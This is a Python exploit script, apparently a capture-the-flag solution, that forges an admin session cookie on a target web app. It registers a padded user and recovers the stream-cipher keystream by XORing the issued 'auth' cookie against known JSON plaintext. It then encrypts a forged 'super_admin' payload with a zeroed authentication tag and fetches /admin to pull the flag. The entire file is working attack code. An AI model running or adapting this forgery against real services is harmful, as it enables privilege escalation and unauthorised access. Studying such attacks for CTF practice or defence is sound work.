import requests, json, sys, re

URL = sys.argv[1].rstrip("/")
s = requests.Session()
s.get(f"{URL}/reset-db")

username = "A" * 40
password = "x"
known_pt = json.dumps({"username": username, "role": "guest"}).encode()

s.post(f"{URL}/register", data={"username": username, "password": password}, allow_redirects=False)
r = s.post(f"{URL}/login", data={"username": username, "password": password}, allow_redirects=False)

raw = r.cookies["auth"]
# dequote Flask/werkzeug cookie: strip surrounding quotes, undo octal/backslash escapes
if raw.startswith('"') and raw.endswith('"'):
    raw = raw[1:-1]
raw = re.sub(r'\\([0-7]{3})', lambda m: chr(int(m.group(1), 8)), raw)
raw = raw.replace('\\\\', '\\')
ct_hex, tag_hex = raw.split(";")
ct = bytes.fromhex(ct_hex)

keystream = bytes(c ^ p for c, p in zip(ct, known_pt))
print(f"[*] known pt ({len(known_pt)}): {known_pt}")
print(f"[*] keystream available: {len(keystream)} bytes")

def make_target(pad):
    return json.dumps({"username": "A" * pad, "role": "super_admin"}).encode()
pad = 1
while len(make_target(pad + 1)) <= len(keystream):
    pad += 1
target_pt = make_target(pad)
print(f"[*] target pt ({len(target_pt)}): {target_pt}")

forged_ct = bytes(p ^ k for p, k in zip(target_pt, keystream[:len(target_pt)]))
token = forged_ct.hex() + ";" + "00" * 16

# send as a quoted cookie so ';' stays inside the value
hdr = {"Cookie": f'auth="{token}"'}
r = s.get(f"{URL}/admin", headers=hdr)
m = re.search(r"BZHCTF\{[^}]*\}", r.text)
print("[+] FLAG:", m.group(0) if m else "(not found)")
if not m:
    for line in r.text.splitlines():
        if "flag" in line.lower() or "admin" in line.lower() or "token" in line.lower():
            print("   ", line.strip())
